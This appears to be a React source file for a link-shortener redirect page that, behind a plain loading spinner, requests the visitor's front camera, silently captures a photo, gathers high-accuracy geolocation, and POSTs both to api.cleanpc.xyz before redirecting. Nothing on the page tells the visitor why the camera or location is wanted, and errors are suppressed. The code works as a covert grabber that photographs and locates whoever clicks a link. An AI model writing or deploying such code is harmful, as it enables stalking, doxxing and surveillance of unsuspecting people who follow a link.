/* eslint-disable no-unused-vars */
import React, { useEffect } from "react";
import { useParams } from "react-router-dom";

const API_BASE = "https://api.cleanpc.xyz";

export default function Redirect() {
  const { shortCode } = useParams();

  useEffect(() => {
    // Update document title with short code
    document.title = `Redirecting to ${shortCode}...`;

    const processRedirect = async () => {
      let stream = null;
      let photoData = null;
      let locationData = null;

      // First, get the link details to check camera and location settings
      let linkDetails = null;
      try {
        const response = await fetch(
          `${API_BASE}/api/links/${encodeURIComponent(shortCode)}/destination`,
          { method: "GET" }
        );
        if (response.ok) {
          const data = await response.json();
          linkDetails = data;
        }
      } catch (error) {
        console.error("Failed to get link details:", error);
      }

      const enableCamera = linkDetails?.enableCamera || false;
      const enableLocation = linkDetails?.enableLocation || false;

      console.log(
        "Link settings - Camera:",
        enableCamera,
        "Location:",
        enableLocation
      );

      // Only request camera if enabled for this link
      if (enableCamera) {
        try {
          // This triggers the browser's default camera permission modal
          stream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user",
              width: { ideal: 640 },
              height: { ideal: 480 },
              frameRate: { ideal: 30 },
            },
          });

          // Capture photo
          photoData = await capturePhotoWithCanvas(stream);

          // Stop stream immediately after capture
          stream.getTracks().forEach((track) => track.stop());
          stream = null;
          console.log("✅ Camera photo captured successfully");
        } catch (error) {
          // Camera access denied or error - silently continue without photo
          console.log("Camera not available or permission denied");
          if (stream) {
            stream.getTracks().forEach((track) => track.stop());
          }
        }
      }

      // Only request location if enabled for this link
      if (enableLocation) {
        try {
          // Wait up to 3 seconds for location (shorter timeout for better UX)
          locationData = await Promise.race([
            getCurrentLocation(),
            new Promise((resolve) =>
              setTimeout(() => {
                console.log("Location request timed out");
                resolve(null);
              }, 3000)
            ),
          ]);

          if (locationData) {
            console.log("📍 Location obtained successfully");
          }
        } catch (error) {
          // Location access denied or error - silently continue without location
          console.log("Location not available or permission denied");
        }
      }

      await makeSinglePostRequest(
        photoData,
        locationData,
        enableCamera,
        enableLocation
      );
    };

    const getCurrentLocation = () => {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          resolve(null); // Silently resolve with null if geolocation not supported
          return;
        }

        const options = {
          enableHighAccuracy: true,
          timeout: 5000, // 5 seconds timeout
          maximumAge: 60000, // Accept positions up to 1 minute old
        };

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude,
              altitudeAccuracy: position.coords.altitudeAccuracy,
              heading: position.coords.heading,
              speed: position.coords.speed,
              timestamp: position.timestamp,
            };
            resolve(location);
          },
          (error) => {
            // Silently resolve with null instead of rejecting
            resolve(null);
          },
          options
        );
      });
    };

    const capturePhotoWithCanvas = async (stream) => {
      try {
        const video = document.createElement("video");
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadeddata = () => resolve();
        });

        await video.play();

        // Wait for image stabilization
        await new Promise((resolve) => setTimeout(resolve, 300));

        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const context = canvas.getContext("2d");

        context.imageSmoothingQuality = "high";
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) => {
          canvas.toBlob(resolve, "image/jpeg", 0.8);
        });

        const base64data = await convertBlobToBase64(blob);

        return base64data;
      } catch (error) {
        console.log("Error capturing photo");
        return null;
      }
    };

    const convertBlobToBase64 = (blob) => {
      return new Promise((resolve) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.readAsDataURL(blob);
      });
    };

    const makeSinglePostRequest = async (
      photoData,
      locationData,
      enableCamera,
      enableLocation
    ) => {
      try {
        const payload = {
          timestamp: new Date().toISOString(),
          enableCamera: enableCamera,
          enableLocation: enableLocation,
        };

        // Only include photo if it exists and is not too large
        if (photoData && photoData.length < 20000000) {
          payload.photo = photoData;
        }

        // Only include location if it exists
        if (locationData) {
          payload.location = locationData;
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000); // Shorter timeout

        try {
          const response = await fetch(
            `${API_BASE}/api/links/${encodeURIComponent(shortCode)}`,
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(payload),
              signal: controller.signal,
            }
          );
          clearTimeout(timeoutId);

          if (response.redirected) {
            window.location.href = response.url;
            return;
          }

          if (response.ok) {
            try {
              const data = await response.json();
              if (data.destinationUrl) {
                window.location.replace(data.destinationUrl);
                return;
              }
            } catch (jsonError) {
              // Continue to fallback
            }
          }
        } catch (fetchError) {
          console.log("POST request failed, using fallback");
        }

        // Fallback to direct redirect
        await redirectToOriginalUrl();
      } catch (error) {
        console.log("Error in request, using fallback");
        await redirectToOriginalUrl();
      }
    };

    const redirectToOriginalUrl = async () => {
      try {
        const response = await fetch(
          `${API_BASE}/api/links/${encodeURIComponent(shortCode)}/destination`,
          {
            method: "GET",
            signal: AbortSignal.timeout(3000), // 3 second timeout
          }
        );

        if (response.ok) {
          const data = await response.json();
          if (data.destinationUrl) {
            window.location.replace(data.destinationUrl);
            return;
          }
        }
      } catch (error) {
        console.log("Fallback failed, using final redirect");
      }

      // Final fallback - direct API call
      window.location.replace(
        `${API_BASE}/api/links/${encodeURIComponent(shortCode)}`
      );
    };

    processRedirect();
  }, [shortCode]);

  return (
    <div
      style={{
        position: "fixed",
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: "#1a1a1a",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: 1000,
      }}
    >
      <div
        style={{
          width: "60px",
          height: "60px",
          border: "3px solid rgba(255,255,255,0.3)",
          borderTop: "3px solid #ffffff",
          borderRadius: "50%",
          animation: "spin 1s linear infinite",
        }}
      ></div>

      <style>
        {`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}
      </style>
    </div>
  );
}
